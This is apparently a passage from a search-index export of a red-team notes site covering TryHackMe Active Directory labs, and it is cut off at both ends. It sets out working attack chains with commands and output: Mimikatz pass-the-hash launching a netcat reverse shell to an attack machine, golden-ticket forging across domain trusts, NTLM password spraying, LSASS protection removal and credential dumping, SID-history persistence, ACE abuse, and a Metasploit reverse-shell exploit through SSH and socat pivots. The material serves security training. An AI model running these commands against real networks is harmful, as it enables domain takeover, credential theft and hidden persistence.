/rc4:96ea24eff4dff1fbe13818fbf12ea7d8 /run:\"c:\\tools\\nc64.exe -e cmd.exe <IP attack machine> 5556\" AES128 hash: mimikatz # sekurlsa::pth /user:Administrator /domain:za.tryhackme.com /aes128:b65ea8151f13a31d01377f5934bf3883 /run:\"c:\\tools\\nc64.exe -e cmd.exe <IP attack machine> 5556\" If we have the AES256 hash: mimikatz # sekurlsa::pth /user:Administrator...",
    "cat": "red_through",
    "type": "html"
  },
  {
    "objectID": "e170918ced25ac2b6d28a47dd4fa9de1",
    "u": "https://ad.tymyrddin.dev/docs/exploit/trusts",
    "t": "Exploiting domain trusts ",
    "c": "Exploiting domain trusts  A forest, in Active Directory terms, consists of domain trees. Trusts define how domains in a forest can talk to one another. The main types of trusts are: Directional: Trust flows from one domain to another trusted domain Transitive: Trust flows between multiple trusted domains KRBTGT and Golden tickets  If an attacker compromises a domain controller and achieves full SYSTEM rights, it is possible to extract the hash of the krbtgt account. This would allow the attacker to create TGS tickets for any resources they choose. In order to create golden tickets, the following must be known: FQDN of the domain SID of the domain Username to impersonate KRBTGT hash The first three are usually easy to recover. The last one requires a domain compromise since the KRBTGT password hash is only stored on domain controllers. Dumping the KRBTGT hash  Use the RDP session on THMSERVER2 to recover the KRBTGT password hash using Mimikatz with DC Sync: C:\\Tools>mimikatz_trunk\\x64\\mimikatz.exe .#####. mimikatz 2.2.0 (x64) #19041 Aug 10 2021 17:19:53 .## ^ ##. \"A La Vie, A L'Amour\" - (oe.eo) ## / \\ ## /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com ) ## \\ / ## > https://blog.gentilkiwi.com/mimikatz '## v ##' Vincent LE TOUX ( vincent.letoux@gmail.com ) '#####' > https://pingcastle.com / https://mysmartlogon.com ***/ mimikatz # privilege::debug Privilege '20' OK mimikatz # lsadump::dcsync /user:za\\krbtgt [DC] 'za.tryhackme.loc' will be the domain [DC] 'THMDC.za.tryhackme.loc' will be the DC server [DC] 'za\\krbtgt' will be the user account [rpc] Service : ldap [rpc] AuthnSvc : GSS_NEGOTIATE (9) Object RDN : krbtgt ** SAM ACCOUNT ** SAM Username : krbtgt Account Type : 30000000 ( USER_OBJECT ) User Account Control : 00000202 ( ACCOUNTDISABLE NORMAL_ACCOUNT ) Account expiration : Password last change : 4/25/2022 7:18:22 PM Object Security ID : S-1-5-21-3885271727-2693558621-2658995185-502 Object Relative ID : 502 Credentials: Hash NTLM: removed ntlm- 0: removed lm - 0: removed ... Getting the SIDs  Recover two SIDs: The SID of the child domain controller (THMDC), to be impersonated in the forged TGT The SID of the Enterprise Admins in the parent domain, to be added as an extra SID to the forged TGT Use the AD-RSAT Powershell cmdlets to recover the SID of the child domain controller: PS C:\\> Get-ADComputer -Identity \"THMDC\" DistinguishedName : CN=THMDC,OU=Domain Controllers,DC=za,DC=tryhackme,DC=loc DNSHostName : THMDC.za.tryhackme.loc Enabled : True Name : THMDC ObjectClass : computer ObjectGUID : bd651750-782b-4b09-93b4-b5987ec7311b SamAccountName : THMDC$ SID : S-1-5-21-3885271727-2693558621-2658995185-1001 UserPrincipalName : Recover the SID of the Enterprise Admins group by querying the parent domain controller: PS C:\\> Get-ADGroup -Identity \"Enterprise Admins\" -Server thmrootdc.tryhackme.loc DistinguishedName : CN=Enterprise Admins,CN=Users,DC=tryhackme,DC=loc GroupCategory : Security GroupScope : Universal Name : Enterprise Admins ObjectClass : group ObjectGUID : a23ae384-16e8-44d5-9b36-8173c4e0e5de SamAccountName : Enterprise Admins SID : S-1-5-21-3330634377-removed-519 Exploiting domain trusts  Use Mimikatz to generate a golden ticket. mimikatz # kerberos::golden /user:Administrator /domain:za.tryhackme.loc /sid:S-1-5-21-3885271727-2693558621-2658995185-1001 /service:krbtgt /rc4:16f9af38fca3ada405386b3b57366082 /sids:S-1-5-21-3330634377-1326264276-632209373-519 /ptt Try browsing the remote file system of \\\\thmrootdc.tryhackme.loc\\C$ (the UNC path to the C$ share). The flag is on THMROOTDC in the Administrator’s Desktop folder (flag6.txt).",
    "cat": "red_through",
    "type": "html"
  },
  {
    "objectID": "e4796a5afc251170f2357a3f4765e025",
    "u": "https://ad.tymyrddin.dev/docs/breach/ntlm",
    "t": "NTLM authenticated services ",
    "c": "NTLM authenticated services  New Technology LAN Manager (NTLM) is the suite of security protocols used to authenticate users’ identities in AD. NTLM can be used for authentication by using a challenge-response-based scheme called NetNTLM. This authentication mechanism is used by the services on a network. And some services that use NetNTLM may also be exposed to the internet. Examples: Internally-hosted Exchange (Mail) servers that expose an Outlook Web App (OWA) login portal. Remote Desktop Protocol (RDP) service of a server being exposed to the internet. Exposed VPN endpoints that were integrated with AD. Web applications that are internet-facing and make use of NetNTLM. The user is now either granted access or denied access, authorisation is performed on the Exchange server with consultation of the msg.target.com Domain Controller. NTLM is generally considered insecure because it uses outdated cryptography that is vulnerable to several modes of attacks. NTLM is also vulnerable to pass-the-hash and brute-force attacks. Password spraying  Most AD environments have account lockout configured, we won’t be able to run a full brute-force attack. Instead, a password spraying attack might work. We could use tools such as Hydra to assist with the password spraying attack. The room uses a script named ntlm_passwordspray.py . The core function takes a suggested password and a URL to target as input and attempts to authenticate to the URL with each username in the textfile. By monitoring the differences in HTTP response codes from the application, we can determine if the credential pair is valid or not. If the credential pair is valid, the application responds with a 200 HTTP (OK) code. If the pair is invalid, the application returns a 401 HTTP (Unauthorised) code. The parameters: userfile - Textfile containing usernames ( usernames.txt ) fqdn - Fully qualified domain name associated with the organisation we are attacking ( za.tryhackme.com ) password - The password we want to use for our spraying attack ( Changeme123 ) attackurl - The URL of the application that supports Windows Authentication ( http://ntlmauth.za.tryhackme.com ) python ntlm_passwordspray.py -u usernames.txt -f za.tryhackme.com -p Changeme123 -a http://ntlmauth.za.tryhackme.com/ Results: [*] Starting passwords spray attack using the following password: Changeme123 [-] Failed login with Username: anthony.reynolds [-] Failed login with Username: samantha.thompson [-] Failed login with Username: dawn.turner [-] Failed login with Username: frances.chapman [-] Failed login with Username: henry.taylor [-] Failed login with Username: jennifer.wood [+] Valid credential pair found! Username: hollie.powell Password: Changeme123 [-] Failed login with Username: louise.talbot [+] Valid credential pair found! Username: heather.smith Password: Changeme123 [-] Failed login with Username: dominic.elliott [+] Valid credential pair found! Username: gordon.stevens Password: Changeme123 [-] Failed login with Username: alan.jones [-] Failed login with Username: frank.fletcher [-] Failed login with Username: maria.sheppard [-] Failed login with Username: sophie.blackburn [-] Failed login with Username: dawn.hughes [-] Failed login with Username: henry.black [-] Failed login with Username: joanne.davies [-] Failed login with Username: mark.oconnor [+] Valid credential pair found! Username: georgina.edwards Password: Changeme123 [*] Password spray attack completed, 4 valid credential pairs found",
    "cat": "red_through",
    "type": "html"
  },
  {
    "objectID": "cdac4106d9f5f787b82699230879a026",
    "u": "https://ad.tymyrddin.dev/docs/pivot/portforward",
    "t": "Port forwarding ",
    "c": "Port forwarding  SSH tunnelling  SSH, as it already has built-in functionality to do port forwarding through a feature called SSH Tunneling. While SSH used to be a protocol associated with Linux systems, Windows now ships with the OpenSSH client by default, so you can expect to find it in many systems nowadays, independent of their operating system. On Windows machines, most likely no SSH server will be available: Start a tunnel from the compromised machine, acting as an ssh client, to the attack machine, which will act as an ssh server. Making a connection back to our attacker’s machine, we will want to create a user in it without access to any console for tunnelling and set a password to use for creating the tunnels. useradd tunneluser -m -d /home/tunneluser -s /bin/true passwd tunneluser The SSH tunnel can be used to do either local or remote port forwarding. SSH remote port forwarding  Remote port forwarding is useful, for example, when having gained control over the 2.2.2.2 Windows host (it does not need to be administrator access) and would like to use it as a pivot to access a port on a server to which we can not directly connect. Take a reachable port from the SSH client (the compromised machine) and project it into a remote ssh server (the attacker's machine). To forward port 3389 on the server back to our attacker’s machine, on the compromised Windows host: C:\\> ssh tunneluser@1.1.1.1 -R 3389:3.3.3.3:3389 -N This establishes an SSH session from 2.2.2.2 (Compromised host) to 1.1.1.1 (Attacker machine) using the tunneluser user. Because the tunneluser is not allowed to run a shell on the attacker machine, we need to run the ssh command with the -N switch to prevent the client from requesting one, or the connection will exit immediately. The -R switch is used to request a remote port forward, and the syntax requires us first to indicate the port we will be opening at the ssh server ( 3389 ), followed by a colon and then the IP and port of the socket we will be forwarding ( 3.3.3.3:3389 ). Port numbers do not need to match. When up and running, we can go to the attacker’s machine and RDP into the forwarded port to reach the server: xfreerdp /v:127.0.0.1 /u:<username> /p:<password> SSH local port forwarding  Local port forwarding allows for “pulling” a port from an ssh server into the ssh client. Any host on the network that can not connect directly to the attacker machine but can connect to the compromised host will now be able to reach the services offered on the attack machine through the pivot host. Take any service available in our attacker's machine and make it available through a port on the compromised host. To forward port 80 from the attack machine and make it available from the compromised host, run: C:\\> ssh tunneluser@1.1.1.1 -L *:80:127.0.0.1:80 -N The -L option requires indicating which local socket used by the compromised host to receive connections on ( *:80 ) and the remote socket to connect to from the attack machine perspective ( 127.0.0.1:80 ). Opening a new port on the compromised host, add a firewall rule to allow for incoming connections (with dir=in ). This requires administrative privileges: netsh advfirewall firewall add rule name=\"Open Port 80\" dir=in action=allow protocol=TCP localport=80 Up and running, any user pointing their browsers to the compromised host at http://2.2.2.2:80 will see the website published by the attack machine. Port forwarding with socat  socat is not as flexible as ssh , and it is more noisy, but if ssh is not available on the compromised host, may be an option. It must be transferred to the compromised host first. Access port 3389 on the server using the compromised host as a pivot, with a similar effect as SSH remote port forwarding. To access port 3389 on the server using the compromised host: C:\\>socat TCP4-LISTEN:3389,fork TCP4:3.3.3.3:3389 The fork option forks a new process for each connection received, making multiple connections without closing possible. Otherwise, it would be closed after the first connection finishes. And because a port is being opened on the pivot host, create a firewall rule: netsh advfirewall firewall add rule name=\"Open Port 3389\" dir=in action=allow protocol=TCP localport=3389 The compromised host will spawn port 80 and listen for connections to be forwarded to port 80 on the attack machine. To expose port 80 from the attack machine, making it reachable by the server: C:\\>socat TCP4-LISTEN:80,fork TCP4:1.1.1.1:80 Dynamic port forwarding and SOCKS  When wanting to run scans against many ports of a host, or even many ports across many machines through a pivot host, dynamic port forwarding seems a good choice. It allows for pivoting through a host and establishing several connections to any IP addresses/ports we want, by using a SOCKS proxy. Establish a reverse dynamic port forwarding ssh tunnel on the compromised host: C:\\> ssh tunneluser@1.1.1.1 -R 9050 -N Edit the proxychains configuration on the attack machine: sudo nano /etc/proxychains4.conf Go down to the [ProxyList] section and add your proxy connection. The default port is 9050 , but any port will work as long as it matches the one we used when establishing the SSH tunnel. If we now want to execute any command through the proxy, we can use proxychains , for example: proxychains curl http://pxeboot.za.tryhackme.com Note: nmap might not work well with SOCKS in some circumstances Flags  Connect to THMJMP2 via SSH using the credentials from the first task. Connect via RDP to THMIIS using socat . Exploit vulnerable Rejetto HFS on the Domain Controller. RDP to THMIIS  With the credentials from the distributor, ssh into the jumphost: ssh username@za.tryhackme.com@thmjmp2@za.tryhackme.com On the jumphost, run socat: C:\\tools\\socat\\>socat TCP4-LISTEN:50000,fork TCP4:THMIIS.za.tryhackme.com:3389 The firewall is disabled. Set up a listener on port 50000 on the attack machine, and connect to THMIIS via RDP from the attack machine by pivoting through the listener at THMJMP2: xfreerdp /v:THMJMP2.za.tryhackme.com:13389 /u:t1_thomas.moore /p:MyPazzw3rd2020 Flag is on desktop of t1_thomas.moore. Exploit Rejetto HFS on the Domain Controller  Use local port forwarding by adding -L *:6666:127.0.0.1:6666 and -L *:7777:127.0.0.1:7777 to the ssh command on the jumphost THMJMP2. This will bind both ports on THMJMP2 and tunnel any connection back to the attack machine: C:\\> ssh tunneluser@<IP attack machine> -R 8888:thmdc.za.tryhackme.com:80 -L *:6666:127.0.0.1:6666 -L *:7777:127.0.0.1:7777 -N Start Metasploit and configure the exploit so that the required ports match the ports forwarded through THMJMP2: msfconsole msf6 > use rejetto_hfs_exec msf6 exploit(windows/http/rejetto_hfs_exec) > set payload windows/shell_reverse_tcp msf6 exploit(windows/http/rejetto_hfs_exec) > set lhost thmjmp2.za.tryhackme.com msf6 exploit(windows/http/rejetto_hfs_exec) > set ReverseListenerBindAddress 127.0.0.1 msf6 exploit(windows/http/rejetto_hfs_exec) > set lport 7777 msf6 exploit(windows/http/rejetto_hfs_exec) > set srvhost 127.0.0.1 msf6 exploit(windows/http/rejetto_hfs_exec) > set srvport 6666 msf6 exploit(windows/http/rejetto_hfs_exec) > set rhosts 127.0.0.1 msf6 exploit(windows/http/rejetto_hfs_exec) > set rport 8888 msf6 exploit(windows/http/rejetto_hfs_exec) > exploit Receive a shell back at the attack machine. The flag is on C:\\hfs\\flag.txt . Resources  0xBEN Notes and Cheatsheets: Port Forwarding 0xBEN Notes and Cheatsheets: Forward Dynamic SOCKS Proxy 0xBEN Notes and Cheatsheets: Reverse Dynamic SOCKS Proxy",
    "cat": "red_through",
    "type": "html"
  },
  {
    "objectID": "2414018cab62f7e8da7ba6aa0d70c580",
    "u": "https://ad.tymyrddin.dev/docs/enum/readme",
    "t": "Introduction ",
    "c": "Introduction  THM Room: Enumerating Active Directory What?  Enumerate details about the AD setup and structure with authenticated access, even super low-privileged access. Why?  Finding some way to escalate privileges or move laterally to gain additional access until we have enough privileges to execute and reach our goals. How?  Setup for THM AD Credential injection Through Microsoft Management Console Through Command Prompt Through PowerShell Through Bloodhound Cleanup",
    "cat": "red_through",
    "type": "html"
  },
  {
    "objectID": "ae1a619508b4c6367ab7faba85ccf1a8",
    "u": "https://ad.tymyrddin.dev/docs/harvest/lsass",
    "t": "Local Security Authority Subsystem Service ",
    "c": "Local Security Authority Subsystem Service  Local Security Authority Server Service (LSASS) is a Windows process that handles the operating system security policy and enforces it on a system. It verifies logged in accounts and ensures passwords, hashes, and Kerberos tickets. Windows system stores credentials in the LSASS process to enable users to access network resources, such as file shares, SharePoint sites, and other network services, without entering credentials every time a user connects. Thus, the LSASS process is a juicy target for red teamers because it stores sensitive information about user accounts. The LSASS is commonly abused to dump credentials to either escalate privileges, steal data, or move laterally. If we have administrator privileges, we can dump the process memory of LSASS. Windows system allows us to create a dump file, a snapshot of a given process. This could be done either with the Desktop access (GUI) or the command prompt. This attack is defined in the MITRE ATT&CK framework as “OS Credential Dumping: LSASS Memory (T1003)”. To dump any running Windows process using the GUI, open the Task Manager, and from the Details tab, find the required process, right-click on it, and select “Create dump file”. An alternative way to dump a process if a GUI is not available to us is by using ProcDump . ProcDump is a Sysinternals process dump utility that runs from the command prompt. Mimikatz is a well-known tool used for extracting passwords, hashes, PINs, and Kerberos tickets from memory using various techniques. Mimikatz is a post-exploitation tool that enables other useful attacks, such as pass-the-hash, pass-the-ticket, or building Golden Kerberos tickets. Mimikatz deals with operating system memory to access information and requires administrator and system privileges in order to dump memory and extract credentials. Protected LSASS and Mimikatz  To disable LSASS protection: C:\\Tools\\Mimikatz> mimikatz.exe .#####. mimikatz 2.2.0 (x64) #18362 Jul 10 2019 23:09:43 .## ^ ##. \"A La Vie, A L'Amour\" - (oe.eo) ## / \\ ## /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com ) ## \\ / ## > http://blog.gentilkiwi.com/mimikatz '## v ##' Vincent LE TOUX ( vincent.letoux@gmail.com ) '#####' > http://pingcastle.com / http://mysmartlogon.com ***/ mimikatz # privilege::debug Privilege '20' OK mimikatz # sekurlsa::logonpasswords ERROR kuhl_m_sekurlsa_acquireLSA ; Handle on memory (0x00000005) mimikatz # !+ [*] 'mimidrv' service not present [+] 'mimidrv' service successfully registered [+] 'mimidrv' service ACL to everyone [+] 'mimidrv' service started mimikatz # !processprotect /process:lsass.exe /remove Process : lsass.exe PID 528 -> 00/00 [0-0-0] Again  mimikatz # sekurlsa::logonpasswords Authentication Id : 0 ; 515377 (00000000:0007dd31) Session : RemoteInteractive from 3 User Name : Administrator Domain : THM Logon Server : CREDS-HARVESTIN Logon Time : 6/3/2022 8:30:44 AM SID : S-1-5-21-1966530601-3185510712-10604624-500 msv : [00000003] Primary * Username : Administrator * Domain : THM * NTLM : 98d3a787a80d08385cea7fb4aa2a4261 * SHA1 : 64a137cb8178b7700e6cffa387f4240043192e72 * DPAPI : bc355c6ce366fdd4fd91b54260f9cf70 ...",
    "cat": "red_through",
    "type": "html"
  },
  {
    "objectID": "a82925250dbf251bd4693ae0180a8c69",
    "u": "https://ad.tymyrddin.dev/docs/persist/sid",
    "t": "Persistence through SID history ",
    "c": "Persistence through SID history  A quick note here. These techniques are incredibly invasive and hard to remove. Even if you have sign-off on your red team exercise to perform these techniques, you must take the utmost caution when performing these techniques. In real-world scenarios, the exploitation of most of these techniques would result in a full domain rebuild. Make sure you fully understand the consequences of using these techniques and only perform them if you have prior approval on your assessment, and they are deemed necessary. In most cases, a red team exercise would be dechained at this point instead of using these techniques. Meaning you would most likely not perform these persistence techniques but rather simulate them. This one is: Not easily removed except by RSAT tooling Difficult to find, not easily detected The legitimate use case of SID history is to enable access for an account to effectively be cloned to another. This becomes useful when an organisation is busy performing an AD migration as it allows users to retain access to the original domain while they are being migrated to the new one. In the new domain, the user would have a new SID, but we can add the user’s existing SID in the SID history, which will still allow them to access resources in the previous domain using their new account. While SID history is good for migrations, we, as attackers, can also abuse this feature for persistence. One way to abuse this feature is to add the SID of a privileged group – like the Domain Admins group – to the SID history of a low-level user. Even though the user is not a member of the group in AD, the system will authorise them as if they were due to the group SID being in their history. SSH into the domain controller using the given administrator credentials: ssh administrator@za.tryhackme.loc@thmdc.za.tryhackme.loc Inspect the SID history and group membership of the unprivileged account from the credential distributor . powershell -ep bypass Get-ADUser 'user.name' -Properties sidhistory,memberof The SIDHistory property is an empty list {} and the MemberOf property shows that this user is only a member of the Internet Access group. Get the SID of the Domain Admins group. Get-ADGroup 'Domain Admins' Use the DSInternals PowerShell module to add the Domain Admins SID to the user’s SID history : Import-Moduls DSInternals Can not modify the SID history while the NTDS database is running: Stop-Service ntds -Force Add the SID to the low privilege account’s SID history: Add-ADDBSidHistory -SamAccountName 'donald.ross' -SidHistory 'S-1-5-21-3885271727-2693558621-2658995185-512' -DatabasePath 'C:\\Windows\\NTDS\\ntds.dit' Restart the NTDS database: Start-Service ntds SSH to thmwrk1 to test the new privileges: ssh user.name@za.tryhackme.loc@thmwrk1.za.tryhackme.loc Check access to a privileged resource on the domain controller: dir \\\\thmdc.za.tryhackme.loc\\c$\\Users Resources  Sneaky Active Directory Persistence #14: SID History",
    "cat": "red_through",
    "type": "html"
  },
  {
    "objectID": "e912f5aa6ea7450fcfda1b9a76b9826d",
    "u": "https://ad.tymyrddin.dev/docs/exploit/permissions",
    "t": "Exploiting permission delegation ",
    "c": "Exploiting permission delegation  Exploiting ACEs  Access Control Entries (ACEs) populate Discretionary Access Control Lists (DACLs). These ACLs determine the permissions that certain AD objects have over others. Almost any AD object can be secured with ACEs, which then describe the allowed and denied permissions that any other AD object has against the target object. Certain ACEs can be very dangerous if misconfigured: ForceChangePassword: Set a user’s password without knowing their current password. AddMembers: Add users (including oneself), groups, or computers to a target group. GenericAll: Complete control over an object, including the ability to change the user’s password, register an SPN or add an AD object to the target group. GenericWrite: Update any non-protected parameters of our target object. For example, could update the scriptPath parameter, which would set a user’s logon script. WriteOwner: Update the owner of the target object. Could make ourselves the owner, allowing us to gain additional permissions over the object. WriteDACL: We have the ability to write new ACEs to the target object’s DACL. For example, could write an ACE that grants our account full control over the target object. AllExtendedRights: Perform any action associated with extended AD rights against the target object. For example, the ability to force change a user’s password. Bloodhound  Sharphound has already been executed. The data is in the .zip task file. Launch neo4j and bloodhound and import the data. sudo neo4j console sudo bloodhound --no-sandbox Drag the .zip file into the Bloodhound window. Search for our initial account retrieved from http://distributor.za.tryhackme.loc/creds Privilege Escalation  Look at the info in the Node Info tab, it is pretty obvious that the initial access user does not have many privileges. We have the ability to RDP into THMWRK1, but this will only provide us with low-privileged access. Compromise the Tier 2 Admins group (administrative privileges on all workstations). Ask Bloodhound if there is perhaps a road that we can follow to compromise this group (Add your user account as the start position and the Tier 2 Admins group as the end position). An administrator has misconfigured the Permission Delegation of the IT Support group by providing the Domain Users group with the AddMembers ACE. This means that any member of the Domain Users group (including our account) can add accounts to the IT Support Group. Furthermore, Bloodhound shows that the IT Support Group has the ForceChangePassword ACE for the Tier 2 Admins group members. This is not really a misconfiguration since Tier 2 admins are not that sensitive, but it provides a very potent attack path when combined with the initial misconfiguration. Add your user account as the start position and the Tier 2 Admins group as the end position. Right-click GenericWrite and choose Help to read more information about the privilege escalation path. Add AD account to the IT Support group  RDP to thmwrk1.za.tryhackme.loc and open a PowerShell terminal. xfreerdp /v:thmwrk1.za.tryhackme.loc /u:'max.smith' /p:'<given password>' Use the Add-ADGroupMember PowerShell cmdlet from the AD-RSAT toolset. Windows PowerShell Copyright (C) Microsoft Corporation. All rights reserved. PS C:\\Users\\max.smith> $user = Get-ADUser -Identity 'max.smith' PS C:\\Users\\max.smith> $group = Get-ADGroup -Identity 'IT Support' PS C:\\Users\\max.smith> Add-ADGroupMember -Identity $group -Members $user PS C:\\Users\\max.smith> Get-ADGroupMember -Identity $group ... distinguishedName : CN=max.smith,OU=IT,OU=People,DC=za,DC=tryhackme,DC=loc name : max.smith objectClass : user objectGUID : f0cd5ecd-6a42-4eff-8015-071e1dc3747b SamAccountName : max.smith SID : S-1-5-21-3885271727-2693558621-2658995185-1142 ... Force a new password on a T2 Admin  PS C:\\Users\\max.smith> Get-ADGroupMember -Identity \"Tier 2 Admins\" Pick one close to the bottom, or randomly. $password = ConvertTo-SecureString 'Password123' -AsPlainText -Force PS C:\\Users\\max.smith> $t2admin = Get-ADGroupMember -Identity 'Tier 2 Admins' | Get-Random -Count 1 PS C:\\Users\\max.smith> $t2admin.Name t2_caroline.dawson PS C:\\Users\\max.smith> Set-ADAccountPassword -Identity $t2admin -Reset -NewPassword $password Set-ADAccountPassword : Access is denied At line:1 char:1 + Set-ADAccountPassword -Identity $t2admin -Reset -NewPassword $passwor ... + ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ + CategoryInfo : PermissionDenied: (CN=t2_caroline....ryhackme,DC=loc:ADAccount) [Set-ADAccountPassword], UnauthorizedAccessException + FullyQualifiedErrorId : ActiveDirectoryCmdlet:System.UnauthorizedAccessException,Microsoft.ActiveDirectory.Manag ement.Commands.SetADAccountPassword Note: If you get an Access Denied error, your permissions have not yet propagated through the domain. This can take up to 10 minutes. The best approach is to terminate the SSH or RDP session, take a quick break, and then reauthenticate and try again. Windows PowerShell Copyright (C) Microsoft Corporation. All rights reserved. PS C:\\Users\\max.smith> $t2admin = Get-ADGroupMember -Identity 'Tier 2 Admins' | Get-Random -Count 1 PS C:\\Users\\max.smith> $t2admin.Name t2_alan.riley PS C:\\Users\\max.smith> $password = ConvertTo-SecureString 'Password123' -AsPlainText -Force PS C:\\Users\\max.smith> Set-ADAccountPassword -Identity $t2admin -Reset -NewPassword $password PS C:\\Users\\max.smith> Authenticate to THMWRK1 using this target account with its new password. You currently have administrative access to this workstation. The flag is on the Desktop of the Administrator user on THMWRK1 (flag1.txt).",
    "cat": "red_through",
    "type": "html"
  },
  {
    "objectID": "3a51ff16b6f1a42b01e919e7f33c1b95",
    "u": "https://ad.tymyrddin.dev/docs/harvest/wcm",
    "t": "Windows Credential Manager ",
    "c": "Windows Credential Manager  Credential Manager is a Windows feature that stores logon-sensitive information for websites, applications, and networks. It contains login credentials such as usernames, passwords, and internet addresses. There are four credential categories: Web credentials contain authentication details stored in Internet browsers or other applications. Windows credentials contain Windows authentication details, such as NTLM or Kerberos. Generic credentials contain basic authentication details, such as clear-text usernames and passwords. Certificate-based credentials: Authenticated details based on certifications. Note that authentication details are stored on the user’s folder and are not shared among Windows user accounts. And, they are cached in memory. Listing the Available Credentials from the Credentials Manager: C:\\Users\\Administrator>VaultCmd /list To check for any stored credentials in the Web Credentials vault: C:\\Users\\Administrator>VaultCmd /listproperties:\"Web Credentials\" To list more information about the stored credentials: C:\\Users\\Administrator>VaultCmd /listcreds:\"Web Credentials\" Credential Dumping  The VaultCmd is not able to show the password. Use Get-WebCredentials.ps1 : C:\\Users\\Administrator>powershell -ex bypass Windows PowerShell Copyright (C) Microsoft Corporation. All rights reserved. PS C:\\Users\\Administrator> Import-Module C:\\Tools\\Get-WebCredentials.ps1 PS C:\\Users\\Administrator> Get-WebCredentials UserName Resource Password Properties -------- -------- -------- ---------- THMUser internal-app.thm.red E4syPassw0rd {[hidden, False], [applicationid, 00000000-0000-0000-0000-000000000000], [application, MSEdge]} RunAs  C:\\Users\\thm>runas /savecred /user:THM.red\\thm-local cmd.exe Mimikatz  To dump clear-text passwords stored in the Credential Manager from memory: C:\\Users\\Administrator>c:\\Tools\\Mimikatz\\mimikatz.exe .#####. mimikatz 2.2.0 (x64) #19041 May 19 2020 00:48:59 .## ^ ##. \"A La Vie, A L'Amour\" - (oe.eo) ## / \\ ## /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com ) ## \\ / ## > http://blog.gentilkiwi.com/mimikatz '## v ##' Vincent LE TOUX ( vincent.letoux@gmail.com ) '#####' > http://pingcastle.com / http://mysmartlogon.com ***/ mimikatz # privilege::debug Privilege '20' OK mimikatz # sekurlsa::credman",
    "cat": "red_through",
    "type": "html"
  },
  {
    "objectID": "8d164da348c0fe841a76a0885999a933",
    "u": "https://ad.tymyrddin.dev/docs/exploit/kerberos",
    "t": "Exploiting kerberos delegation ",
    "c": "Exploiting kerberos delegation  The general purpose of Kerberos delegation is to allow an application or service to access a resource on another machine on behalf of a user or machine. If a user logs into an application, the application will request resources on other machines on behalf of the user. It removes the need for a global service account with less granular permissions. Unconstrained Delegation  With Unconstrained Delegation, a host has no limit on the resources it can access on behalf of a user who connects, as long as the user has the TRUSTED_FOR_DELEGATION flag set. Once a user connects, the host requests a TGT for the user and caches it locally for future use. Given the TGT, an attacker could proceed to access any resource accessible by the user owner of the TGT. For example, if an Administrator logged on to the host with unconstrained delegation, the attacker would now be in possession of the Administrator’s TGT. Constrained Delegation  Constrained Delegation restricts the type of services a service acount can request on behalf of a user. For example, if a domain service account (sevice principal) was running a web application on a web server, constrained delegation would enable the administrator to choose which services to delegate access to on behalf of another user. An administrator could selectively filter delegation to resources such as HTTP, CIFS, LDAP, HOST, MSSQL, etc. If an attacker compromised a host configured for constrained delegation and obtained the NTLM hash or password of the service account, the attacker could request a TGT for the service account and use the TGT to request a TGS for the delegate account to access a particular service. Resource-Based Constrained Delegation  This model of delegation works inversely from the other delegation types. Introduced by Microsoft in 2012, Resource-Based Constrained Delegation (RBCD) once again provided additional restrictions on Kerberos Delegation for security. RBCD changes the delegation model entirely. Instead of specifying which object can delegate to which service, the service now specifies which objects can delegate to it. This allows the service owner to control who can access it. For example, if we have permission to configure RBCD for a service, we have the ability to set the msDS-AllowedToActOnBehalfOfOtherIdentity attribute for the AD Object. We can populate this attribute with the details of an AD account that we have access to. To now gain access to the service, we can generate a TGT for the account we control, which will allow us to interact with this service. Lab: Constrained Delegation Exploitation  Using the tier 2 admin credentials gained in the permissions exploitation , RDP to THMWRK1 as T2 Admin for some enumeration and exploitation. Enumeration  Use PowerView and the Get-NetUser cmdlet of PowerSploit for this enumeration. PowerView is going to almost always get detected by antivirus! Windows PowerShell Copyright (C) Microsoft Corporation. All rights reserved. PS C:\\Users\\t2_alan.riley> Import-Module C:\\tools\\PowerView.ps1 PS C:\\Users\\t2_alan.riley> Get-NetUser -TrustedToAuth logoncount : 43 badpasswordtime : 11/7/2022 3:13:34 PM distinguishedname : CN=IIS Server,CN=Users,DC=za,DC=tryhackme,DC=loc objectclass : {top, person, organizationalPerson, user} displayname : IIS Server lastlogontimestamp : 11/6/2022 6:03:06 PM userprincipalname : svcIIS@za.tryhackme.loc name : IIS Server objectsid : S-1-5-21-3885271727-2693558621-2658995185-6155 samaccountname : svcIIS codepage : 0 samaccounttype : USER_OBJECT accountexpires : NEVER countrycode : 0 whenchanged : 11/6/2022 6:03:06 PM instancetype : 4 usncreated : 78494 objectguid : 11e42287-0a25-4d73-800d-b62e2d2a2a4b sn : Server lastlogoff : 1/1/1601 12:00:00 AM msds-allowedtodelegateto : {WSMAN/THMSERVER1.za.tryhackme.loc, WSMAN/THMSERVER1, http/THMSERVER1.za.tryhackme.loc, http/THMSERVER1} objectcategory : CN=Person,CN=Schema,CN=Configuration,DC=tryhackme,DC=loc dscorepropagationdata : 1/1/1601 12:00:00 AM serviceprincipalname : HTTP/svcServWeb.za.tryhackme.loc givenname : IIS lastlogon : 11/7/2022 3:14:12 PM badpwdcount : 0 cn : IIS Server useraccountcontrol : NORMAL_ACCOUNT, DONT_EXPIRE_PASSWORD, TRUSTED_TO_AUTH_FOR_DELEGATION whencreated : 4/27/2022 11:26:21 AM primarygroupid : 513 pwdlastset : 4/29/2022 11:50:25 AM usnchanged : 147565 There is only one user allowed to act as a delegate for other users, namely svcIIS@za.tryhackme.loc . This account is allowed to delegate access to WSMAN/THMSERVER1.za.tryhackme.loc and http/THMSERVER1.za.tryhackme.loc . PS C:\\Users\\t2_alan.riley> Get-CimInstance -ClassName Win32_Service | Where-Object {$_.StartName -like 'svcIIS*'} | Select-Object * Name : thmwinauth Status : OK ExitCode : 0 DesktopInteract : False ErrorControl : Normal PathName : C:\\Windows\\system32.cmd.exe ServiceType : Own Process StartMode : Auto Caption : thmwinauth Description : InstallDate : CreationClassName : Win32_Service Started : False SystemCreationClassName : Win32_ComputerSystem SystemName : THMWRK1 AcceptPause : False AcceptStop : False DisplayName : thmwinauth ServiceSpecificExitCode : 0 StartName : svcIIS@za.tryhackme.loc State : Stopped TagId : 0 CheckPoint : 0 DelayedAutoStart : True ProcessId : 0 WaitHint : 0 PSComputerName : CimClass : root/cimv2:Win32_Service CimInstanceProperties : {Caption, Description, InstallDate, 